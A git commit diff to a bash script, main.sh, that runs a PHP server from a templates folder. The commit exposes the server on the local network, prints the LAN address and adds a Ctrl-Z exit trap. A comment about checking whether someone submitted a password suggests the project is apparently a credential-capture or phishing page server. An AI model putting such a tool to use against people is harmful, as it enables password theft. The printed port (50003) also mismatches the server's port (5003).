ac356ca3f4a6086348e973cac24e5051f28530d0
rambo782 <94486029+rambo782@users.noreply.github.com>
2021-11-27 19:10:44 +0000

    Main Code

--- main.sh
+++ main.sh
@@ -2,9 +2,11 @@
 
 # Start Server
 start(){
-    cd templates && php -S 127.0.0.1:5002 > /dev/null 2>&1 &
-    echo -e "\e[36mServer Started!"
-    echo -e "\e[33mLocalhost: http://127.0.0.1:5002"
+    cd templates && php -S 0.0.0.0:5003 > /dev/null 2>&1 &
+    IP=$(hostname -I | xargs)
+    echo -e "\e[36m[+]Server Started!"
+    echo -e "\e[33m[+]Localhost: http://127.0.0.1:50003"
+    echo "[+]Local Network: http://$IP:5003"
 }
 
 # Check if Someone Submitted Password
@@ -19,12 +21,20 @@ check(){
 
 # If control-c is pressed
 ctrl_c(){
-    echo -e "\r\e[31mGood Bye!"
+    echo -e "\r\e[31m[-]Good Bye!"
+    pkill php
+    exit
+}
+
+# If control-z is pressed
+ctrl_z(){
+    echo -e "\r\e[31m[-]Good Bye!"
     pkill php
     exit
 }
 
 start
+trap ctrl_z SIGTSTP
 trap ctrl_c INT
 # Run Forever
 while :; do
